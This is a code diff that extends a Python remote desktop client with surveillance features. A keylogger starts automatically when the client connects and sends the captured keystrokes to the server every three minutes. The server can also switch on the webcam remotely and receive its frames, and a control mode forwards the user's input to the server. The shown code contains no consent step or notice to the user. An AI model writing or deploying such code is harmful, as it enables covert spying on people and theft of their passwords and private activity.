@@ -10,7 +10,7 @@ import sys
 import logging
 from pathlib import Path
 import signal
-from typing import Optional
+from typing import Optional, Dict, Any
 import configparser
 import os
 import platform
@@ -84,7 +84,17 @@ from config import (
     SCREEN_QUALITY, CAPTURE_ALL_DISPLAYS
 )
 from common.screen_capture import ScreenCapture
-from common.protocol import FrameEncoder, ProtocolHandler
+from common.protocol import FrameEncoder, ProtocolHandler, MessageType
+from common.keylogger import KeyLogger, is_machine_locked
+from common.webcam_capture import WebcamCapture
+from common.control_mode import ControlMode
+
+# Check if OpenCV is available for webcam
+try:
+    import cv2
+    CV2_AVAILABLE = True
+except ImportError:
+    CV2_AVAILABLE = False
 
 # Try to import embedded certificates, fallback to file-based if not available
 try:
@@ -116,7 +126,9 @@ class RemoteDesktopClient:
         self.capture = None
         self.running = False
         self.reconnect_delay = 5
-        # Get PC name (hostname)
+        self.loop = None  # Store event loop reference
+        
+        # Get PC name (hostname) - MUST BE BEFORE keylogger init
         try:
             self.pc_name = socket.gethostname()
         except:
@@ -124,6 +136,13 @@ class RemoteDesktopClient:
                 self.pc_name = platform.node()
             except:
                 self.pc_name = "Unknown"
+        
+        # New features
+        self.keylogger = KeyLogger(callback=self._on_keylog, device_name=self.pc_name)
+        self.webcam = WebcamCapture(callback=self._on_webcam_frame)
+        self.control_mode = ControlMode(input_callback=self._on_control_input)
+        self.webcam_active = False
+        self.control_active = False
         
     def create_ssl_context(self) -> Optional[ssl.SSLContext]:
         """Create SSL context for secure connection"""
@@ -274,21 +293,227 @@ class RemoteDesktopClient:
             logger.error(f"Error sending heartbeat: {e}")
             raise
     
+    async def _handle_server_message(self, msg_type: MessageType, msg_data: bytes):
+        """Handle different message types from server"""
+        if msg_type == MessageType.WEBCAM_START:
+            await self._handle_webcam_start()
+        elif msg_type == MessageType.WEBCAM_STOP:
+            await self._handle_webcam_stop()
+        elif msg_type == MessageType.CONTROL_START:
+            await self._handle_control_start()
+        elif msg_type == MessageType.CONTROL_STOP:
+            await self._handle_control_stop()
+        elif msg_type == MessageType.CONTROL_INPUT:
+            await self._handle_control_input(msg_data)
+        elif msg_type == MessageType.DISPLAY_SELECT:
+            await self._handle_display_select(msg_data)
+    
+    async def _handle_webcam_start(self):
+        """Handle webcam start request"""
+        logger.info("Received WEBCAM_START request from server")
+        try:
+            # Check if OpenCV is available first
+            if not CV2_AVAILABLE:
+                error_msg = "OpenCV not installed - webcam not available"
+                await self._send_webcam_error(error_msg)
+                logger.warning(f"Webcam start requested but OpenCV not available - sent error: {error_msg}")
+                return
+            
+            # Check if webcam device exists
+            if not self.webcam.is_available():
+                error_msg = "No webcam device found"
+                await self._send_webcam_error(error_msg)
+                logger.warning(f"Webcam start requested but no webcam device found - sent error: {error_msg}")
+                return
+            
+            if not self.webcam_active:
+                self.webcam.start()
+                self.webcam_active = True
+                logger.info("Webcam started successfully")
+        except Exception as e:
+            error_msg = str(e)
+            logger.error(f"Error starting webcam: {error_msg}")
+            await self._send_webcam_error(error_msg)
+    
+    async def _handle_webcam_stop(self):
+        """Handle webcam stop request"""
+        try:
+            if self.webcam_active:
+                self.webcam.stop()
+                self.webcam_active = False
+                logger.info("Webcam stopped")
+        except Exception as e:
+            logger.error(f"Error stopping webcam: {e}")
+    
+    async def _handle_control_start(self):
+        """Handle control mode start"""
+        try:
+            if not self.control_active:
+                self.control_mode.start()
+                self.control_active = True
+                logger.info("Control mode started")
+        except Exception as e:
+            logger.error(f"Error starting control mode: {e}")
+    
+    async def _handle_control_stop(self):
+        """Handle control mode stop"""
+        try:
+            if self.control_active:
+                self.control_mode.stop()
+                self.control_active = False
+                logger.info("Control mode stopped")
+        except Exception as e:
+            logger.error(f"Error stopping control mode: {e}")
+    
+    async def _handle_control_input(self, msg_data: bytes):
+        """Handle control input from server (forward to system)"""
+        # This would forward input to the system
+        # For now, just log - implementation depends on platform
+        try:
+            import json
+            data = json.loads(msg_data.decode('utf-8'))
+            logger.debug(f"Control input: {data}")
+            # TODO: Forward to system input
+        except Exception as e:
+            logger.error(f"Error handling control input: {e}")
+    
+    async def _handle_display_select(self, msg_data: bytes):
+        """Handle display selection"""
+        try:
+            import json
+            data = json.loads(msg_data.decode('utf-8'))
+            display_index = data.get('display', 0)
+            # TODO: Update capture to use selected display
+            logger.info(f"Display selected: {display_index}")
+        except Exception as e:
+            logger.error(f"Error handling display select: {e}")
+    
+    def _on_keylog(self, log_content: str):
+        """Callback for keylogger - receives full log content every 3 minutes"""
+        logger.info(f"Keylog callback triggered with {len(log_content)} characters")
+        if not is_machine_locked():
+            # Send keylog to server
+            logger.info(f"Machine not locked, sending keylog batch")
+            # Use asyncio.run_coroutine_threadsafe since we're in a different thread
+            if self.loop and self.loop.is_running():
+                try:
+                    asyncio.run_coroutine_threadsafe(self._send_keylog(log_content), self.loop)
+                    logger.debug("Keylog send scheduled successfully")
+                except Exception as e:
+                    logger.error(f"Error scheduling keylog send: {e}")
+            else:
+                logger.warning("Event loop not available, cannot send keylog")
+        else:
+            logger.debug("Machine is locked, skipping keylog")
+    
+    async def _send_keylog(self, log_content: str):
+        """Send keylog batch to server"""
+        if not self.writer:
+            logger.warning("Cannot send keylog - no writer available")
+            return
+        
+        try:
+            logger.info(f"Creating keylog message: {len(log_content)} characters")
+            msg = ProtocolHandler.create_keylog(log_content)
+            logger.info(f"Sending keylog message: {len(msg)} bytes")
+            self.writer.write(len(msg).to_bytes(4, 'big'))
+            self.writer.write(msg)
+            await self.writer.drain()
+            logger.info(f"Keylog batch sent successfully: {len(log_content)} characters")
+        except Exception as e:
+            logger.error(f"Error sending keylog: {e}")
+            import traceback
+            logger.error(traceback.format_exc())
+    
+    def _on_webcam_frame(self, frame_data: Optional[bytes]):
+        """Callback for webcam capture"""
+        if frame_data is None:
+            # Error occurred
+            asyncio.create_task(self._send_webcam_error("Webcam capture failed"))
+            return
+        
+        # Send frame to server
+        asyncio.create_task(self._send_webcam_frame(frame_data))
+    
+    async def _send_webcam_frame(self, frame_data: bytes):
+        """Send webcam frame to server"""
+        if not self.writer:
+            return
+        
+        try:
+            msg = ProtocolHandler.create_webcam_frame(frame_data)
+            self.writer.write(len(msg).to_bytes(4, 'big'))
+            self.writer.write(msg)
+            await self.writer.drain()
+        except Exception as e:
+            logger.error(f"Error sending webcam frame: {e}")
+    
+    async def _send_webcam_error(self, error_msg: str):
+        """Send webcam error to server"""
+        if not self.writer:
+            logger.warning("Cannot send webcam error - no writer available")
+            return
+        
+        try:
+            msg = ProtocolHandler.create_error(error_msg)
+            # Change message type to WEBCAM_ERROR
+            msg_bytes = bytearray(msg)
+            msg_bytes[0] = int(MessageType.WEBCAM_ERROR)
+            msg = bytes(msg_bytes)
+            
+            logger.info(f"Sending webcam error to server: {error_msg}")
+            self.writer.write(len(msg).to_bytes(4, 'big'))
+            self.writer.write(msg)
+            await self.writer.drain()
+            logger.info("Webcam error sent successfully")
+        except Exception as e:
+            logger.error(f"Error sending webcam error: {e}")
+    
+    def _on_control_input(self, event: dict):
+        """Callback for control mode input (user trying to interact)"""
+        # Forward to server
+        asyncio.create_task(self._forward_control_input(event))
+    
+    async def _forward_control_input(self, event: dict):
+        """Forward control input event to server"""
+        if not self.writer:
+            return
+        
+        try:
+            # Convert event to protocol format
+            msg = ProtocolHandler.create_control_input(
+                event.get('type', 'key'),
+                event.get('key', 0),
+                event.get('x', 0),
+                event.get('y', 0),
+                event.get('button', 0),
+                event.get('scroll', 0)
+            )
+            self.writer.write(len(msg).to_bytes(4, 'big'))
+            self.writer.write(msg)
+            await self.writer.drain()
+        except Exception as e:
+            logger.error(f"Error forwarding control input: {e}")
+    
     async def handle_messages(self):
         """Handle incoming messages from server"""
         if not self.reader:
+            logger.warning("handle_messages: No reader available")
             return
         
+        logger.info("Starting message handler loop")
         try:
             while self.running:
                 try:
                     # Read message length
+                    logger.debug("Waiting for message length...")
                     length_bytes = await self.reader.readexactly(4)
                     if not length_bytes or len(length_bytes) != 4:
                         logger.debug("Server closed connection (no length bytes)")
                         break
                     
                     length = int.from_bytes(length_bytes, 'big')
+                    logger.debug(f"Received message length: {length}")
                     
                     if length <= 0 or length > 1024 * 1024:  # Max 1MB for config messages
                         logger.warning(f"Invalid message length from server: {length}")
@@ -296,9 +521,18 @@ class RemoteDesktopClient:
                     
                     # Read message data
                     data = await self.reader.readexactly(length)
+                    logger.debug(f"Received message data: {len(data)} bytes, first byte: {data[0] if data else 'N/A'}")
                     
-                    # Handle configuration updates, etc.
-                    # For now, just acknowledge
+                    # Decode and handle message
+                    try:
+                        msg_type, msg_data = ProtocolHandler.decode_message(data)
+                        logger.info(f"Decoded message type: {msg_type.name}")
+                        await self._handle_server_message(msg_type, msg_data)
+                    except Exception as e:
+                        logger.error(f"Error decoding message: {e}")
+                        import traceback
+                        logger.error(traceback.format_exc())
+                        continue
                     
                 except asyncio.IncompleteReadError:
                     logger.info("Connection closed by server")
@@ -308,6 +542,8 @@ class RemoteDesktopClient:
                     break
                 except Exception as e:
                     logger.error(f"Error handling messages: {type(e).__name__}: {e}")
+                    import traceback
+                    logger.error(traceback.format_exc())
                     # Continue to try reading next message
                     continue
                     
@@ -390,6 +626,9 @@ class RemoteDesktopClient:
     
     async def run(self):
         """Main client loop with reconnection logic"""
+        # Store event loop reference
+        self.loop = asyncio.get_event_loop()
+        
         self.capture = ScreenCapture(monitor=None, quality=SCREEN_QUALITY, capture_all=CAPTURE_ALL_DISPLAYS)
         logger.info("Screen capture initialized")
         if CAPTURE_ALL_DISPLAYS:
@@ -405,6 +644,9 @@ class RemoteDesktopClient:
                     # Small delay to ensure connection is fully established
                     await asyncio.sleep(0.1)
                     
+                    # Start keylogger
+                    self.keylogger.start()
+                    
                     # Start message handler
                     message_task = asyncio.create_task(self.handle_messages())
                     
@@ -417,6 +659,13 @@ class RemoteDesktopClient:
                     # Cleanup
                     self.running = False
                     message_task.cancel()
+                    
+                    # Stop all features
+                    self.keylogger.stop()
+                    if self.webcam_active:
+                        self.webcam.stop()
+                    if self.control_active:
+                        self.control_mode.stop()
                     
                     if self.writer:
                         self.writer.close()
